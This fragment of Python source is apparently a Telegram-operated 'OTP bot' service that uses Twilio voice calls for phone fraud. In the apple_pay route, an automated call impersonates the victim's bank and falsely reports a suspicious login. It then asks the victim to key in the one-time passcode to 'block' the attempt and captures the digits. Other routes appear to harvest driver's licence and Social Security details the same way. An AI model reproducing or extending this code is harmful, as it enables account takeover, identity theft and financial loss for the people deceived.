...
def send_text(message):
    ...
    try:
        ...
        bot.send_message(chat_id, "An error has occured , contact admin @Godzella0324")
...
def how_to_help(message):
    bot.send_message(message.chat.id, "• Contact @Godzella0324 👑\n\n• Use /faq for more help")


@bot.message_handler(commands=['faq'])
def how_faq(message):
    bot.send_message(message.chat.id, "• Please contact @Godzella0324 for tutorial videos, and more helpful information (FAQ > Bot Help).")
...
@app.route("/dlmd/<userid>", methods=['GET', 'POST'])
def resp_dl_md(userid):
    chat_id = userid
    resp = VoiceResponse()
    choice = request.values['AnsweredBy']
    if choice == 'human' or choice == 'unknown':
        gather = Gather(action='/gatherdlmd/'+userid, finishOnKey='*', input="dtmf")
...
@app.route("/gatherdlmd/<userid>", methods=['GET', 'POST'])
...
@app.route("/ssnmd/<userid>", methods=['GET', 'POST'])
...
@app.route("/applpy/<userid>", methods=['GET', 'POST'])
def apple_pay(userid):
    print(f"Received request for userid: {userid}")  # Debug statement
    chat_id = userid
    bankname = fetch_bankname(userid)
    resp = VoiceResponse()
    choice = request.values['AnsweredBy']
    print(f"Choice: {choice}")  # Debug statement
    if choice == 'human' or choice == 'unknown':
        gather = Gather(action='/gatherappl/'+userid, finishOnKey='*', input="dtmf")
        gather.say(f"This is an automated call from {bankname}, We have detected a suspicious attempt to login to your account, if this was you, end the call, To block this attempt, please enter the one time passcode sent to your phone number followed by the star key")
        resp.append(gather)
        resp.redirect('/applpy/<userid>')
    else:
        resp.hangup()
        bot.send_message(chat_id, "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.", parse_mode='Markdown')
        return ''
    print(f"Returning response: {resp}")  # Debug statement
    return str(resp)

@app.route("/gatherappl/<userid>", methods=['GET', 'POST'])
def apple_otp(userid):
    chat_id = userid
    resp = VoiceResponse()
    if 'Digits' in request.values:
        resp.say("Thank you, this attempt has been blocked! Goodbye.")
